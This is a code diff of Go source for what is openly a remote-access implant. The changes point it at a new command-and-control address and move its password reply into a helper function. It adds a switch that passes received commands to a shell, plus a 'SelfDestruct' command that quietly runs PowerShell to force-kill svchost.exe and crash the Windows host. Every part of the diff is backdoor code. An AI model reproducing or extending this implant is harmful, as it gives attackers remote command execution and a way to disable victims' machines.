@@ -21,9 +21,13 @@ func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
 		time.Sleep(10 * time.Second)
 		return addr, false
 	}
-	addr.Write([]byte("i_L0V_y0U_Ju5t1n_P3t3R\n"))
+	reply2Auth(&addr)
 	*attempts = 0
 	return addr, true
+}
+
+func reply2Auth(conn *net.Conn) {
+	(*conn).Write([]byte("i_L0V_y0U_Ju5t1n_P3t3R\n"))
 }
 
 func listen4Commands(conn *net.Conn) string {
@@ -159,23 +163,37 @@ func ls(conn *net.Conn, implantWD *string) {
 // }
 
 func main() {
-	c2Address := "192.168.1.13:400"
+	c2Address := "192.168.0.106:1234"
 	attempts := 0
 	//implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
 	conn, result := callHome(&c2Address, &attempts)
+	// if !result {
+	// 	fmt.Println("Couldn't call home")
+	// 	os.Exit(0)
+	// }
 	for !result {
 		conn, result = callHome(&c2Address, &attempts)
 	}
 	for { //Main Program Loop
-		//conn.Write([]byte("MoTerpreter $ "))
 		command := listen4Commands(&conn)
 		fmt.Println(command)
-		if command == "AreYouAlive\n" {
-			fmt.Println("IAMALIVE")
-			conn.Write([]byte("IAMALIVE"))
-			continue
+		switch command {
+		case "AreYouAlive\n":
+			reply2Auth(&conn)
+		case "SelfDestruct\n": //This only works if it has admin privs
+			{
+				ps_instance := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "/c", "taskkill.exe", "/f", "/im", "svchost.exe")
+				ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+				output, err := ps_instance.Output()
+				if err != nil {
+					fmt.Println("Couldnt Execute the command")
+				}
+				fmt.Println(output)
+				conn.Write([]byte("NoTime2Die\n"))
+			}
+		default: //I am turning the default into an error statement and appending all shell commands with a > to avoid crashes
+			executeCommands(&conn, &command)
 		}
-		executeCommands(&conn, &command)
 	}
 }
